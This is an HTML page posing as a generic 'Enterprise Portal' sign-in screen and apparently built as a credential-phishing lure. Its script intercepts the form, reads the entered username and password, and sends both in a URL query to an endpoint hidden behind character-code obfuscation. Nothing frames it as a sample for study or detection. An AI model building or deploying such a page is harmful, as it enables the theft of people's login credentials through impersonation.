<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta http-equiv="Pragma" content="no-cache">

    <title>Enterprise Portal</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',Arial,sans-serif;background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;position:relative;overflow:hidden}body::before{content:'';position:absolute;width:200%;height:200%;background:radial-gradient(circle at 20% 50%,rgba(31,111,235,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(9,105,218,.08) 0%,transparent 50%);animation:bgmove 20s ease-in-out infinite;z-index:0}body::after{content:'';position:absolute;inset:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 40px,rgba(31,111,235,.06) 40px,rgba(31,111,235,.06) 41px),repeating-linear-gradient(90deg,transparent,transparent 40px,rgba(31,111,235,.06) 40px,rgba(31,111,235,.06) 41px);z-index:0}@keyframes bgmove{0%,100%{transform:translate(0,0)}50%{transform:translate(-10%,-10%)}}.c{background:#161b22;padding:48px 40px;width:100%;max-width:420px;box-shadow:0 8px 24px rgba(0,0,0,.4);border:1px solid #30363d;border-radius:8px;position:relative;z-index:1}.ls{margin-bottom:32px;text-align:center}.lg{width:56px;height:56px;margin:0 auto 20px;background:linear-gradient(135deg,#1f6feb 0%,#0969da 100%);border-radius:8px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(31,111,235,.3);position:relative;animation:float 3s ease-in-out infinite}.lg::before{content:'';position:absolute;inset:-4px;background:conic-gradient(from 0deg,#1f6feb,#0969da,#1f6feb);border-radius:10px;opacity:0;animation:rotateBorder 4s linear infinite,fadeGlow 2s ease-in-out infinite;z-index:-1;filter:blur(10px)}@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}@keyframes rotateBorder{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes fadeGlow{0%,100%{opacity:0}50%{opacity:.7}}.lg svg{width:28px;height:28px;fill:#fff}.h{font-size:24px;font-weight:400;color:#c9d1d9;margin-bottom:8px;letter-spacing:-.3px}.sh{font-size:14px;color:#8b949e;font-weight:400}.fg{margin-bottom:16px}label{display:block;font-size:14px;font-weight:600;color:#c9d1d9;margin-bottom:6px}.inp{width:100%;padding:10px 12px;border:1px solid #30363d;border-radius:6px;font-size:14px;color:#c9d1d9;background:#0d1117;transition:border-color .2s,box-shadow .2s}.inp:focus{outline:0;border-color:#1f6feb;box-shadow:0 0 0 3px rgba(31,111,235,.15)}.inp::placeholder{color:#6e7681}.bc{margin-top:24px}.btn{width:100%;background:linear-gradient(135deg,#1f6feb 0%,#0969da 100%);color:#fff;border:none;padding:12px 16px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;box-shadow:0 4px 12px rgba(31,111,235,.3)}.btn:hover{transform:translateY(-1px);box-shadow:0 6px 16px rgba(31,111,235,.4)}.btn:active{transform:translateY(0)}.ft{text-align:center;margin-top:24px;font-size:12px;color:#6e7681;line-height:1.6}.al{padding:12px 16px;margin-bottom:20px;font-size:13px;display:none;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#8b949e;border-left:3px solid #1f6feb}@media (max-width:480px){.c{padding:32px 24px}}</style>
</head>
<body>
    <div class="c">
        <div class="ls">
            <div class="lg">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="white">
                    <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5zm0 2.18l8 4v8.82c0 4.52-3.12 8.75-7.5 9.93-.34.09-.66.09-1 0C7.12 25.75 4 21.52 4 17V8.18l8-4zM10 12v6h4v-6h-4zm2-6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
                </svg>
            </div>
            <div class="h">Sign in to your account</div>
            <div class="sh">Enter your credentials to continue</div>
        </div>
        <div class="al" id="x">
            Please authenticate to access the system
        </div>
        <form id="z" method="GET">
            <div class="fg">
                <label for="u">Username</label>
                <input type="text" id="u" name="email" class="inp" required autocomplete="username" placeholder="Enter your username">
            </div>
            <div class="fg">
                <label for="w">Password</label>
                <input type="password" id="w" name="password" class="inp" required autocomplete="current-password" placeholder="Enter your password">
            </div>
            <div class="bc">
                <button type="submit" class="btn">Sign in</button>
            </div>
        </form>
        <div class="ft">
            Protected by enterprise security protocols<br>
            Need help? Contact your system administrator
        </div>
    </div>
    <script>
    window.addEventListener('load',function(){document.getElementById('x').style.display='block'});
    var f=document.getElementById('z');
    f.addEventListener('submit',function(e){
        e.preventDefault();
        var m=document.getElementById('u').value;
        var s=document.getElementById('w').value;
        var b=String.fromCharCode(47,103,101,116);
        window.location.href=b+'?email='+encodeURIComponent(m)+'&password='+encodeURIComponent(s);
    });
    </script>
</body>
</html>
